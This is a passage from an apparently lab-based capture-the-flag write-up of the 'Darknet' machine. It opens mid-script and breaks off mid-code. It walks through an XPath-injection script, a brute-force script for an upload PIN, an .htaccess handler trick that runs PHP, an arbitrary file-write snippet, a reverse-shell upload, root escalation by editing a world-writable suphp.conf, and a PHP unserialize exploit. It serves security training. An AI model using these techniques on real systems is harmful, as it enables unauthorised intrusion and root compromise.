    &lt;span style=&#34;color: #f8f8f2&#34;&gt;carry_on&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;name&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ascii_letters:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;payload_tpl&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(path,cmp_pos,c)}&lt;/span&gt;

        &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;requests&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;get(URL,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;params&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;payload)&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;text&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;find(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;errorlevel&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;carry_on&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;True&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;break&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;cmp_pos&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Path name:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;name&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So I ran this with the current path&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/darknet# python xpath.py 
u
us
use
user
Path name: user
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;and the parent path&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/darknet# python xpath.py ..
a
au
aut
auth
Path name: auth
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Ok, that will help me get some more data from the file. I try to see if the
email field will work with &lt;code&gt;1]/email|auth[id=1&lt;/code&gt;. I need the &lt;code&gt;auth&lt;/code&gt; part because
without it the query will not close correctly in the main script, and this
makes sure the closing &lt;code&gt;]&lt;/code&gt; won&amp;rsquo;t error.&lt;/p&gt;

&lt;p&gt;So now I should be able to get the username with &lt;code&gt;1]/username|auth[id=1&lt;/code&gt;.
Now let&amp;rsquo;s try the password field. I tried &lt;code&gt;pass&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; before I realised we&amp;rsquo;re dealing with another
language here. Thanks to the logins I know that the spanish for password is &lt;em&gt;clave&lt;/em&gt;.
&lt;code&gt;id=1]/clave|auth[id=1&lt;/code&gt; throws up the password! Result. Using these detail
I am able to login at &lt;code&gt;signal8.darknet.com/xpanel&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&#34;stage-4:3817275722f75303351ad52bb23d8c3d&#34;&gt;Stage 4&lt;/h1&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/TVG7WhQ.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Oooh a PHP editor! Sweet&amp;hellip; yeah right. Clicking the link goes to a page that shows:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Tr0ll Found

The requested URL /xpath/xpanel/edit.php was not found on this server.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So after some manual digging nothing comes up. Time to break out &lt;code&gt;dirbuster&lt;/code&gt; again
to find &lt;code&gt;ploy.php&lt;/code&gt; which presents me with&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/DueLt5z.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;It requires a file which it uploads, as well as a specific combination of checkboxes to be checked.
Just trying some random checkboxes I can determine that the correct number of boxes is 4,
but instead of trying this all manually, I&amp;rsquo;ll script this part.
Looking at the source of the page I see the values for the checkboxes.
All I have to do is iterate of all possible combinations of 4 of these numbers.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s my bruteforce script:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;requests&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;itertools&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;devnull&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;passwd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;j4tC1P9aqmY&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;base_url&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;http://signal8.darknet.com/xpanel/&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;login_url&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base_url&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;user,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;passwd}&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;sess&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;requests&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;session()&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sess&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;post(login_url,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;payload)&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;ploy_url&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;base_url&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;ploy.php&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;attempt&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;itertools&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;permutations([&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;37&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;58&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;22&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;72&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;10&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;59&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;17&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;99&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Action&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Upload&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
               &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;checkbox[]&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;attempt&lt;/span&gt;

              &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;files&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;imag&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;info.txt&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;info.php&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)}&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sess&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;post(ploy_url,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;payload,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;files&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;files)&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;text&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;find(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Key incorrecta!&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Found pin: &amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;attempt&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The correct PIN is &lt;code&gt;&#39;37&#39;, &#39;10&#39;, &#39;59&#39;, &#39;17&#39;&lt;/code&gt;. I tried to upload a PHP script, but
that won&amp;rsquo;t work. Seems uploading anything with a &lt;code&gt;php&lt;/code&gt; extension is forbidden.
Casting my mind back I noticed that in the apache config I noticed something interesting.
For this site &lt;code&gt;AllowOverride All&lt;/code&gt; is on. Most likely going to be something to
do with &lt;code&gt;.htaccess&lt;/code&gt;. To check this I upload the following file, and then browse to a
non-existant file, to generate a 404&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Order deny,allow
Allow from all
ErrorDocument 404 https://google.com
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;This should direct me to &lt;code&gt;google.com&lt;/code&gt;, which it does, indicating &lt;code&gt;.htaccess&lt;/code&gt; overrides work here.
So what can I do from here that will either allow me to upload a PHP shell or do something else?&lt;/p&gt;

&lt;p&gt;Unfortunately there&amp;rsquo;s another issue: as I upload files, old files seem to get deleted.
I found this out when the 404 redirect stopped working after uploading an html file.&lt;/p&gt;

&lt;p&gt;Luckily I discovered that it&amp;rsquo;s possible to execute php code inside the .htaccess file.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;AddHandler application/x-httpd-php .htaccess                                    
DirectoryIndex .htaccess                                                        
&amp;lt;FilesMatch &amp;quot;^\.htaccess&amp;quot;&amp;gt;                                                      
Order deny,allow                                                                
Allow from all                                                                  
SetHandler application/x-httpd-php                                              
&amp;lt;/FilesMatch&amp;gt;                                                                   
                                                                                
#&amp;lt;?php print $_GET[&amp;quot;test&amp;quot;]; ?&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Sure enough the &lt;code&gt;$_GET[&amp;quot;test&amp;quot;]&lt;/code&gt; variable is on the page. So this should allow me
to get a run some useful code on there somehow.&lt;/p&gt;

&lt;p&gt;After following some blind leads, I wrote a php script that would take a file encoded
with base64 and a filename via a &lt;code&gt;POST&lt;/code&gt; method and write this file out.
(Note: appending the entire script for DAws or similar didn&amp;rsquo;t work).
Something like this should work though:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$fp = fopen($_POST[&amp;#39;name&amp;#39;], &amp;#39;wb&amp;#39;); 
fwrite($fp, base64_decode($_POST[&amp;#39;data&amp;#39;])); 
fclose($fp);
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;At the end of the &lt;code&gt;.htaccess&lt;/code&gt; file. However this always error with a permissions
error.&lt;/p&gt;

&lt;p&gt;After struggling with this for quite some time I got some help from a fellow
#vulnhub resident who helped me out with something I missed. It&amp;rsquo;s &lt;code&gt;suphp&lt;/code&gt; not &lt;code&gt;php&lt;/code&gt;,
so I wasn&amp;rsquo;t executing the script as the &lt;code&gt;errorlevel&lt;/code&gt; user. Derp.&lt;/p&gt;

&lt;p&gt;More info on &lt;a href=&#34;http://suphp.org/Home.html&#34;&gt;suphp&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;stage-5:3817275722f75303351ad52bb23d8c3d&#34;&gt;Stage 5&lt;/h1&gt;

&lt;p&gt;So having sorted that I uploaded &lt;code&gt;DAws&lt;/code&gt; and got myself a reverse shell and explored
once more. Now inside &lt;code&gt;/var/www&lt;/code&gt; there&amp;rsquo;s some files I missed earlier: &lt;code&gt;sec.php&lt;/code&gt;,
&lt;code&gt;Classes/Test.php&lt;/code&gt;, and &lt;code&gt;Classes/Show.php&lt;/code&gt;. Interesting.&lt;/p&gt;

&lt;p&gt;Trying to hit &lt;code&gt;darknet.com/sec.php&lt;/code&gt; errors. Let&amp;rsquo;s take a look inside of it&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Classes/Test.php&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Classes/Show.php&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;empty&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;($_POST[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;])){&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;$_POST[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;$j&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;unserialize($d);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$j;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Rembering that we&amp;rsquo;re dealing with suphp it could well be that the 500 error is
because &lt;code&gt;sec.php&lt;/code&gt; is trying to run as &lt;code&gt;root&lt;/code&gt;. Checking &lt;code&gt;/etc/suphp/suphp.conf&lt;/code&gt;
my suspicion is correct, the &lt;code&gt;min_uid&lt;/code&gt; and &lt;code&gt;min_gid&lt;/code&gt; settings are too high for
&lt;code&gt;root&lt;/code&gt; scripts to run. But hey, as luck would have it (thanks q3rv0) &lt;code&gt;suphp.conf&lt;/code&gt;
is &lt;code&gt;777&lt;/code&gt;. So heading straight to &lt;code&gt;sed&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ sed -i &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;s/min_uid=100/min_uid=0/g&amp;#39;&lt;/span&gt; suphp.conf
sed: couldn&amp;#39;t open temporary file ./sedm2LUZQ: Permission denied
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Hmph. Ok then I&amp;rsquo;ll copy the &lt;code&gt;suphp.conf&lt;/code&gt; to &lt;code&gt;/tmp&lt;/code&gt; and edit it there, then copy
it back. Making sure I change both &lt;code&gt;min_uid&lt;/code&gt; and &lt;code&gt;min_gid&lt;/code&gt;, I reload &lt;code&gt;sec.php&lt;/code&gt; and
get a blank page. No errors are good errors.&lt;/p&gt;

&lt;p&gt;Now that I&amp;rsquo;ve got &lt;code&gt;sec.php&lt;/code&gt; running I can go ahead and see what we might be able to exploit.
Anything we do with this file will run as root, some hopefully this is the last part of
Darknet, because I want my life back :)&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sec.php&lt;/code&gt; unserialises our input, which basically takes a serialised string
and &lt;a href=&#34;https://php.net/manual/en/function.unserialize.php&#34;&gt;unserialises into an object&lt;/a&gt;.
Similar to Python&amp;rsquo;s pickle. There&amp;rsquo;s no way I can call a method on either of the classes,
so I have to see what will get called for me.
The &lt;code&gt;Test&lt;/code&gt; class has a rather useful destructor, which,
will write data to disk and make it world readable. Almost as if that&amp;rsquo;s what
we&amp;rsquo;re supposed to use.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;Test&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$url;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$name_file;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$path;&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;__destruct&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;$data&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;file_get_contents($this&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;url&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;$f&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;fopen($this&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;path&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;$this&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;name_file&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
